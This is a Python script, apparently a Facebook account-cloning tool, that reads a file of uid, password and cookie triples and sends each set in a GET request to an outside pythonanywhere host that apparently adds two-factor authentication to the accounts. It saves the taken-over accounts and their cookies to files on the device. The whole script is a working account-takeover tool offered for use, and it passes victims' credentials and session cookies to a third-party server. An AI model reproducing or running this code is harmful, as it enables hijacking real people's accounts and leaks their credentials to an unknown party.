import os
import requests

class TwoFactorCloner:
    GREEN = '\x1b[1;92m'
    RED = '\x1b[1;91m'
    YELLOW = '\x1b[1;93m'
    WHITE = '\x1b[1;97m'
    
    def __init__(self):
        self.ok = 0
        self.fail = 0

    def AUTO_2F(self, uid, password, cookie):
        send_req = requests.get(f"https://livedeadsegs.pythonanywhere.com/TWO_FACTOR?uid={uid}&password={password}&cookie={cookie}").text
        return send_req


    def divider(self):
        print(f"{self.WHITE}-" * 44)
    def run(self):
        os.system("clear")
        
        print("""\033[1;37m
  ██████╗ ███████╗    ██████╗     ██╗  ██╗
██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
 ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
\033[1;92m╔═════════════════════════════════════════╗
\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
\033[1;92m║ ᗙ  Version  : 1.0                       ║
\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
\033[1;92m╚═════════════════════════════════════════╝
 OLD NEW IDS AUTO 2F / UID|PASS|COOKIS.TXT""")
        self.divider()
        
        get_file = input("Enter file path: ")
        try:
            get_file_info = open(get_file, 'r').read().splitlines()
        except FileNotFoundError:
            exit("File not found")

        for element in get_file_info:
            if element == "":
                break
            try:
                uid, password, cookie = element.split("|")
            except ValueError:
                self.divider()
                print(f"{self.YELLOW}[WRONG FORMAT] " + element)
                self.divider()
                with open("wrong_format.txt", 'a') as f:
                    f.write(element + '\n')
                continue

            data = self.AUTO_2F(uid=uid, password=password, cookie=cookie)
            if '[2F]' in data:
                datax = data.replace("[2F] ", "")
                self.divider()
                print(f"{self.GREEN} [Successful 2F]: {datax} ")
                self.divider()
                #print(f"\03#3[1;37mTotal Checked {len(self.GREEN)} uid\n2F added: \033[1;32m{str(datax)}")
                #print(f"\033[1;#37UID|PASS {self.GREEN} \n2F added: \033[1;32m{datax}")
                self.ok += 1
                with open("/sdcard/GS2X_2F_LIVE.TXT", 'a') as f:
                    f.write(datax + '\n')
                with open("/sdcard/2f_live_with_cookies.txt", "a") as f:
                    f.write(f"{datax}|{cookie}\n")
            elif 'Cookies lol' in data:
                #print(f"{#self.RED}[FL] {data}")
                self.fail += 1
                with open("/sdcard/2f_failed.txt", 'a') as f:
                    f.write(element + '\n')
            elif 'wrong password' in data:
                #print(f#"{self.YELLOW}[Wrong] {data}")
                self.fail += 1
                with open("/sdcard/wrong_pass.txt", 'a') as f:
                    f.write(element + '\n')
            else:
                exit("Error" + data)

        print(f"\033[1;37mTotal Checked {len(get_file_info)} uid\n2F added: \033[1;32m{str(self.ok)}\n\033[1;37m2F Failed: \033[1;31m{str(self.fail)}")

if __name__ == "__main__":
    cloner = TwoFactorCloner()
    cloner.run()   